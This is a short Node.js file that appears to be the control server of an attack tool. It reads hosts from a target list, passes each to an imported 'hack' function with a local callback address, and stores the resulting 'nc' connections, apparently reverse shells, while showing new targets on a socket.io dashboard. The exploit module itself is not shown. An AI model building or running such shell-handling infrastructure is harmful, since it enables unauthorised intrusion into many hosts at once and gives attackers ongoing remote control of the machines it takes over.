const hack = require('./hack');

var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);

var path = require('path');
var _ = require('lodash');

var fs = require('fs');

module.exports = function (config) {

    var targetListFile = path.join(__dirname, 'target-list.txt')


    var targets = [];
    var links = [];
    var inrNum = 0;

    fs.watchFile(targetListFile, () => {
        linkTargets();
    });

    function linkTargets() {
        var targetListContent = fs.readFileSync(targetListFile, 'utf-8');
        var _targets = targetListContent.split('\n');
        _targets.forEach((_target) => {
            if (_.findIndex(targets, (target) => { return target == _target }) == -1) {
                link(_target)
            }
        })
    }

    linkTargets();


    function link(target) {
        targets.push(target)
        inrNum += 1;
        var localPort = config.startLocalPort + inrNum;
        hack(target, config.localIp + ':' + localPort, (nc) => {

            var _target = {
                host: target,
                localPort: localPort,
                linkTime: new Date()
            };

            links.push({
                ..._target,
                nc: nc
            })

            io.sockets.emit('newTarget', _target);
        });
    }


    io.on('connection', function (socket) {
        console.log('a user connected');

        socket.emit('data', links.map((link) => {
            return {
                key: link.localPort,
                host: link.host,
                linkTime: link.linkTime
            }
        }))
    });

    http.listen(config.port, function () {
        console.log('listening on *:' + config.port);
    });
}





